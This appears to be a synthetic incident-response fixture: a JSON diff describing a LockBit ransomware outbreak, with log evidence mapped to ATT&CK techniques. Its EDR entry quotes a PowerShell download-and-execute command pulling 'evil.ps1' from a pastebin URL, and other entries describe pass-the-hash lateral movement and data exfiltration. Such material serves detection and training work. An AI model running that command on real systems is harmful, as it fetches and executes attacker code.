@@ -1,0 +1,52 @@
+{
+  "title": "LockBit Ransomware Outbreak - Finance Division",
+  "description": "LockBit 3.0 ransomware deployment across finance division. Initial access via phishing email, followed by Cobalt Strike beaconing, lateral movement via PsExec, and mass file encryption. Ransom note dropped on all affected systems. T1486 T1566 T1059 T1021 T1047",
+  "severity": "Critical",
+  "evidence": [
+    {
+      "source": "Email Gateway Log",
+      "content": "Phishing email from spoofed-domain.com to user VP-Finance with attachment 'invoice_Q4_2024.docm'. Macro-enabled document detected. T1566.001",
+      "content_type": "log"
+    },
+    {
+      "source": "Sysmon Event 1",
+      "content": "Process creation: cmd.exe /c rundll32.exe C:\\Users\\vpfinance\\AppData\\Local\\Temp\\dllhost.dll,DllEntryPoint. Parent: winword.exe. T1204.002 T1059.003",
+      "content_type": "log"
+    },
+    {
+      "source": "Sysmon Event 3",
+      "content": "Network connection: 192.168.10.45:49321 -> 45.33.32.156:443. Cobalt Strike HTTPS beacon detected. User-Agent: Mozilla/5.0 Windows. T1071.001",
+      "content_type": "network"
+    },
+    {
+      "source": "EDR Alert",
+      "content": "Process creation: powershell.exe -Command Invoke-ObFuscation -Command 'IEX(New-Object Net.WebClient).DownloadString(\"https://pastebin.com/raw/evil.ps1\")' T1059.001 T1086",
+      "content_type": "log"
+    },
+    {
+      "source": "Sysmon Event 11",
+      "content": "File creation: C:\\Users\\vpfinance\\AppData\\Local\\Temp\\2024_dec_invoice.lnk. LNK shortcut to cmd.exe with obfuscated arguments. T1204.002",
+      "content_type": "file"
+    },
+    {
+      "source": "Windows Event Log 4624",
+      "content": "Successful logon from 192.168.10.45 to 192.168.10.201 (FileServer-FS) with user svc_backup via Pass-the-Hash. Source process: lsass.exe. T1550.002 T1021.002",
+      "content_type": "log"
+    },
+    {
+      "source": "PsExec Log",
+      "content": "Service creation: PSEXESVC on host 192.168.10.201 initiated from 192.168.10.45 by NT AUTHORITY\\SYSTEM. Remote service execution of C:\\Windows\\temp\\beacon.exe. T1570 T1021.002",
+      "content_type": "log"
+    },
+    {
+      "source": "File Server Audit",
+      "content": "Mass file rename operations detected on \\\\FileServer-FS\\Finance\\: 2,847 files renamed with extension .lockbit within 30 seconds. Files include .xlsx, .docx, .pdf, .sql, .mdf extensions. T1486",
+      "content_type": "log"
+    },
+    {
+      "source": "Network Capture",
+      "content": "Outbound connection from 192.168.10.201:51022 -> 185.234.72.18:4443. Data upload of 1.2GB. HTTP POST /api/upload with multipart form data containing archived financial data. T1048.002",
+      "content_type": "network"
+    }
+  ]
+}
